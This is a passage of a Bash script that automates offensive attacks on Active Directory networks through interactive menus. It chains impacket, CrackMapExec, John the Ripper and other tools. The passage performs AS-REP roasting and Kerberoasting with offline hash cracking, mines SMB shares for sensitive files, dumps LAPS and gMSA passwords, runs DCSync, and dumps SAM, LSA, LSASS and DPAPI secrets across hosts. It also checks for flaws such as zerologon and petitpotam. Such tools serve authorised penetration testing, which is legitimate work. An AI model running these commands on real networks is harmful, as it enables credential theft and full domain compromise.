            ${python} ${impacket_dir}/GetNPUsers.py "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
        else
            ${python} ${impacket_dir}/GetNPUsers.py ${argument_imp} -dc-ip ${dc_ip}
            ${python} ${impacket_dir}/GetNPUsers.py ${argument_imp} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
        fi
        if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
            echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
        else
            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' | tee ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
        fi
    fi 
    echo -e ""
}

kerberoast_attack () {
    if [ ! -f "${impacket_dir}/GetUserSPNs.py" ]; then
        echo -e "${RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket${NC}"
    else
        if [ "${nullsess_bool}" == false ] ; then
            echo -e "${BLUE}[*] Kerberoast Attack${NC}"
            ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain}
            ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
            if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
                    echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
                else
                    /bin/cat ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
            fi
        fi
    fi 
    echo -e ""
}

john_crack_asrep(){
    if [ ! -f "${john}" ] ; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        echo -e "${YELLOW}[i] Using $pass_list wordlist...${NC}"
        echo -e "${CYAN}[*] Launching john on collected asreproast hashes. This may take a while...${NC}"

        if [ ! -s ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt ]; then
            echo -e "${PURPLE}[-] No accounts with Kerberos preauth disabled found${NC}"
        else
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_list
            echo -e "${GREEN}[+] Printing cracked AS REP Roast hashes...${NC}"
            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show | tee ${output_dir}/Kerberos/asreproast_john_results_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

john_crack_kerberoast(){
    if [ ! -f "${john}" ] ; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        echo -e "${YELLOW}[i] Using $pass_list wordlist...${NC}"
        echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"

        if [ ! -s ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt ]; then
            echo -e "${PURPLE}[-] No SPN accounts found${NC}"
        else
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            $john ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list
            echo -e "${GREEN}[+] Printing cracked Kerberoast hashes...${NC}"
            $john ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show | tee ${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

smb_map_dc () {
    if [ ! -f "${smbmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
    else
        echo -e "${BLUE}[*] SMB shares Enumeration on DC${NC}"
        if [ "${kerb_bool}" == true ] ; then
            echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
        else
            echo -e "${CYAN}[*] Listing accessible SMB shares - Step 1/2${NC}"
            ${smbmap} -H ${dc_ip} ${argument_smbmap} | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_${dc_ip}.txt 2>&1

            echo -e "${CYAN}[*] Listing files in accessible shares - Step 2/2${NC}"
            current_dir=$(pwd)
            mkdir -p ${output_dir}/Shares/SharesDump/${dc_ip}
            cd ${output_dir}/Shares/SharesDump/${dc_ip}
            ${smbmap} -H ${dc_ip} ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_files_${dc_domain}_${dc_ip}.txt 2>&1
            cd ${current_dir}
        fi
    fi
    echo -e ""
}

smb_map () {
    if [ ! -f "${smbmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
    else
        smb_scan

        echo -e "${BLUE}[*] SMB shares Enumeration${NC}"
        echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
            if [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
            else
                ${smbmap} -H $i ${argument_smbmap} | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_${i}.txt 2>&1
            fi
        done

        grep -iaH READ ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.csv
        grep -iaH READ ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.txt

        echo -e "${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}"
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] Listing files in accessible shares on ${i} ${NC}"
            if [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
            else
                current_dir=$(pwd)
                mkdir -p ${output_dir}/Shares/SharesDump/${i}
                cd ${output_dir}/Shares/SharesDump/${i}
                ${smbmap} -H $i ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_files_${dc_domain}_${i}.txt 2>&1
                cd ${current_dir}
            fi
        done
    fi
    echo -e ""
}

keepass_scan_dc () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] keepass_discover requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Search for KeePass-related files and process${NC}"
        ${crackmapexec} smb ${dc_ip} ${argument_cme} -M keepass_discover 2>/dev/null | tee ${output_dir}/Shares/keepass_discover_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

keepass_scan () {    
    smb_scan

    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] keepass_discover requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Search for KeePass-related files and process${NC}"
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Search for KeePass-related files and process from DC only${NC}"
            servers_scan_list=${target_dc}
        fi
        for i in $(/bin/cat ${servers_scan_list}); do
            echo -e "${CYAN}[*] keepass_discover of ${i} ${NC}"
            ${crackmapexec} smb ${i} ${argument_cme} -M keepass_discover 2>/dev/null | tee ${output_dir}/Shares/keepass_discover_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

laps_dump () {
    echo -e "${BLUE}[*] LAPS Dump${NC}"
    ${crackmapexec} ldap ${target} ${argument_cme} -M laps --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
    echo -e ""
}

gmsa_dump () {
    if [ ! -f "${scripts_dir}/gMSADumper.py" ] ; then
        echo -e "${RED}[-] Please verify the location of gMSADumper.py${NC}"
    else
        echo -e "${BLUE}[*] gMSA Dump${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
        else
            ${python} ${scripts_dir}/gMSADumper.py -d ${argument_gMSA} -l ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

secrets_dump_dc () {
    if [ ! -f "${impacket_dir}/secretsdump.py" ] ; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Performing DCSync using secretsdump${NC}"
            ${python} ${impacket_dir}/secretsdump.py "${argument_imp}@${dc_ip}" -just-dc | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

sam_dump_dc () { 
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping SAM from DC using crackmapexec${NC}"
        ${crackmapexec} smb ${dc_ip} ${argument_cme} --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

lsa_dump_dc () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping LSA secrets from DC using crackmapexec${NC}"
        ${crackmapexec} smb ${dc_ip} ${argument_cme} --lsa | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

lsassy_dump_dc () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping LSASS from DC using lsassy${NC}"
        ${crackmapexec} smb ${dc_ip} ${argument_cme} -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

handlekatz_dump_dc () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping LSASS from DC using handlekatz${NC}"
        ${crackmapexec} smb ${dc_ip} ${argument_cme} -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

procdump_dump_dc () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping LSASS from DC using procdump${NC}"
        ${crackmapexec} smb ${dc_ip} ${argument_cme} -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

nanodump_dump_dc () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping LSASS from DC using nanodump${NC}"
        ${crackmapexec} smb ${dc_ip} ${argument_cme} -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

secrets_dump () {
    if [ ! -f "${impacket_dir}/secretsdump.py" ] ; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        smb_scan

        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] impacket requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Dumping credentials using secretsdump${NC}"
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
                ${python} ${impacket_dir}/secretsdump.py "${argument_imp}@${i}" -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

sam_dump () {   
    smb_scan

    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping SAM credentials${NC}"
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Dumping creds from DC only${NC}"
            servers_smb_list=${target_dc}
        fi
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
            ${crackmapexec} smb ${i} ${argument_cme} --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

lsa_dump () {
    smb_scan

    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping LSA credentials${NC}"
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Dumping creds from DC only${NC}"
            servers_smb_list=${target_dc}
        fi
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
            ${crackmapexec} smb ${i} ${argument_cme} --lsa | tee ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

lsassy_dump () {    
    smb_scan
    
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping LSASS using lsassy${NC}"
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Dumping creds from DC only${NC}"
            servers_scan_list=${target_dc}
        fi
        for i in $(/bin/cat ${servers_scan_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
            ${crackmapexec} smb ${i} ${argument_cme} -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt

        done
    fi
    echo -e ""
}

handlekatz_dump () {    
    smb_scan

    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping LSASS using handlekatz${NC}"
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Dumping creds from DC only${NC}"
            servers_scan_list=${target_dc}
        fi
        for i in $(/bin/cat ${servers_scan_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
            ${crackmapexec} smb ${i} ${argument_cme} -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

procdump_dump () {    
    smb_scan

    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping LSASS using procdump${NC}"
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Dumping creds from DC only${NC}"
            servers_scan_list=${target_dc}
        fi
        for i in $(/bin/cat ${servers_scan_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
            ${crackmapexec} smb ${i} ${argument_cme} -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

nanodump_dump () {    
    smb_scan

    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Dumping LSASS using nanodump${NC}"
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Dumping creds from DC only${NC}"
            servers_scan_list=${target_dc}
        fi
        for i in $(/bin/cat ${servers_scan_list}); do
            echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
            ${crackmapexec} smb ${i} ${argument_cme} -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt
        done
    fi
    echo -e ""
}

donpapi_dump_dc () {
    if [ ! -f "${donpapi_dir}/DonPAPI.py" ] ; then
        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
    else
        smb_scan

        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Dumping secrets from DC using DonPAPI${NC}"
            ${python} ${donpapi_dir}/DonPAPI.py "${argument_donpapi}@${dc_ip}" -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${dc_ip}.txt
        fi
    fi
    echo -e ""
}

donpapi_dump () {
    if [ ! -f "${donpapi_dir}/DonPAPI.py" ] ; then
        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
    else
        smb_scan

        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
                ${python} ${donpapi_dir}/DonPAPI.py "${argument_donpapi}@${i}" -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

mssql_enum () {
    if [ ! -f "${scripts_dir}/windapsearch" ] || [ ! -f "${impacket_dir}/GetUserSPNs.py" ]; then
        echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
    else
        echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
        if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m custom --filter "(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))" --attrs dNSHostName | grep dNSHostName | cut -d " " -f 2 | sort -u  >> ${sql_hostname_list}
        elif [ "${nullsess_bool}" == false ]; then
            ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
            for i in $(/bin/cat ${sql_hostname_list}); do
                grep -i $(echo $i | cut -d "." -f 1) ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >> ${sql_ip_list}
            done
        fi
        ${crackmapexec} mssql ${target_sql} ${argument_cme} -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

nopac_check () {
    echo -e "${BLUE}[*] NoPac check ${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M nopac 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
    echo -e ""
}

petitpotam_check () {
    echo -e "${BLUE}[*] PetitPotam check ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        ${crackmapexec} smb ${i} ${argument_cme} -M petitpotam 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt 2>&1
    done
    echo -e ""
}

dfscoerce_check () {
    echo -e "${BLUE}[*] dfscoerce check ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        ${crackmapexec} smb ${i} ${argument_cme} -M dfscoerce 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt 2>&1
    done
    echo -e ""
}

zerologon_check () {
    echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
    ${crackmapexec} smb ${target} ${argument_cme} -M zerologon 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>&1
    echo -e ""
}

ms17-010_check_dc () {
    echo -e "${BLUE}[*] ms17-010 check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M ms17-010 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
    echo -e ""
}

ms17-010_check () {
    smb_scan

    echo -e "${BLUE}[*] ms17-010 check ${NC}"
    ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M ms17-010 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
    echo -e ""
}

spooler_check_dc () {
    echo -e "${BLUE}[*] Print Spooler check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M spooler 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
    echo -e ""
}

spooler_check () {
    echo -e "${BLUE}[*] Print Spooler check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Checking for Spooler and Webdav on DC only${NC}"
        servers_smb_list=${target_dc}
    else
        smb_scan
    fi
   
    ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M spooler 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
    echo -e ""
}

webdav_check_dc () {
    echo -e "${BLUE}[*] WebDAV check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M webdav 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
    echo -e ""
}

webdav_check () {
    smb_scan

    echo -e "${BLUE}[*] WebDAV check ${NC}"
    ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M webdav 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
    echo -e ""
}

shadowcoerce_check_dc () {
    echo -e "${BLUE}[*] shadowcoerce check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M shadowcoerce 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
    echo -e ""
}

shadowcoerce_check () {
    smb_scan

    echo -e "${BLUE}[*] shadowcoerce check ${NC}"
    ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M shadowcoerce 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
    echo -e ""
}

ntlmv1_check_dc () {
    echo -e "${BLUE}[*] ntlmv1 check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M ntlmv1 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
    echo -e ""
}

ntlmv1_check () {
    smb_scan

    echo -e "${BLUE}[*] ntlmv1 check ${NC}"
    ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M ntlmv1 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
    echo -e ""
}

runasppl_check_dc () {
    echo -e "${BLUE}[*] runasppl check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M runasppl 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
    echo -e ""
}

runasppl_check () {
    smb_scan

    echo -e "${BLUE}[*] runasppl check ${NC}"
    ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M runasppl 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
    echo -e ""
}

ad_enum () {
    bhd_enum
    ldapdomain_enum
    windapsearch_enum
    enum4linux_enum
    ridbrute_attack
    users_enum
    passpol_enum
    gpp_enum
    passnotreq_enum
    adcs_enum
    passdesc_enum
    macq_enum
    ldapsign_enum
    deleg_enum_cme
    deleg_enum_imp
    certi_py_enum
    certipy_enum
}

kerberos () {
    kerbrute_enum
    userpass_check
    asrep_attack
    kerberoast_attack
    john_crack_asrep
    john_crack_kerberoast
}

scan_shares () {
    smb_map
    keepass_discover
}

pwd_dump () {
    laps_dump
    gmsa_dump
    secrets_dump
    sam_dump
    lsa_dump
    lsassy_dump
    handlekatz_dump
    procdump_dump
    nanodump_dump
    donpapi_dump
}

vuln_checks () {
    nopac_check
    petitpotam_check
    zerologon_check
    ms17-010_check
    spooler_check
    webdav_check
    dfscoerce_check
    shadowcoerce_check
    ntlmv1_check
    runasppl_check
}

print_info() {
    echo -e "${GREEN}[+] $(date)${NC}"
    echo -e ""
    echo -e ${auth_string}
    echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${dc_FQDN}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${dc_ip}"
    echo -e "${YELLOW}[i]${NC} Running modules: ${modules}"
    echo -e "${YELLOW}[i]${NC} Output folder: $(realpath $output_dir)"
    echo -e ""
}

ad_menu () {
    echo -e ""
    echo -e "${CYAN}[AD Enum menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------"
    echo -e "A) ALL ACTIVE DIRECTORY ENUMERATIONS"
    echo -e "1) BloodHound Enumeration using all collection methods (Noisy!)"
    echo -e "2) BloodHound Enumeration using DCOnly"
    echo -e "3) ldapdomain Enumeration"
    echo -e "4) windapsearch Enumeration"
    echo -e "5) enum4linux-ng Enumeration"
    echo -e "6) RID Brute Force (Null session)"
    echo -e "7) Users Enumeration (Null session)"
    echo -e "8) Password Policy Enumeration"
    echo -e "9) GPP Enumeration"
    echo -e "10) Password not required Enumeration"
    echo -e "11) ADCS Enumeration"
    echo -e "12) Users Description containing word: pass"
    echo -e "13) Get MachineAccountQuota"
    echo -e "14) LDAP-signing check"
    echo -e "15) Trusted-for-delegation check (cme)"
    echo -e "16) Impacket findDelegation Enumeration"
    echo -e "17) certi.py Enumeration"
    echo -e "18) Certipy Enumeration"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

	case ${option_selected} in
        A)
        dns_enum
        ad_enum
        ad_menu
        ;;

        1)
        bhd_enum
        ad_menu
        ;;

		2)
        bhd_enum_dconly
        ad_menu
        ;;

        3)
        ldapdomain_enum
        ad_menu
        ;;

        4)
        windapsearch_enum
        ad_menu
        ;;

        5)
        enum4linux_enum
        ad_menu
        ;;

        6)
        ridbrute_attack
        ad_menu;;

		7)
        users_enum
        ad_menu;;
        
        8)
        passpol_enum
        ad_menu;;

        9)
        gpp_enum
        ad_menu;;

        10)
        passnotreq_enum
        ad_menu;;

        11)
        adcs_enum
        ad_menu;;

        12)
        passdesc_enum
        ad_menu;;

        13)
        macq_enum
        ad_menu;;

        14)
        ldapsign_enum
        ad_menu;;

        15)
        deleg_enum_cme
        ad_menu;;

        16)
        deleg_enum_imp
        ad_menu;;

        17)
        certi_py_enum
        ad_menu;;

        18)
        certipy_enum
        ad_menu;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        ad_menu
        ;;
    esac
}

kerberos_menu () {
    echo -e ""
    echo -e "${CYAN}[Kerberos Attacks menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------------"
    echo -e "A) ALL KERBEROS ATTACKS"
    echo -e "1) kerbrute User Enumeration (Null session)"
    echo -e "2) kerbrute User=Pass Check (Noisy!)"
    echo -e "3) AS REP Roasting Attack"
    echo -e "4) Kerberoast Attack"
    echo -e "5) Cracking AS REP Roast hashes using john the ripper"
    echo -e "6) Cracking Kerberoast hashes using john the ripper"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

	case ${option_selected} in
        A)
        kerberos
        kerberos_menu
        ;;

        1)
        kerbrute_enum
        kerberos_menu
        ;;

		2)
        userpass_check
        kerberos_menu
        ;;

        3)
        asrep_attack
        kerberos_menu
        ;;

        4)
        kerberoast_attack
        kerberos_menu
        ;;

		5)
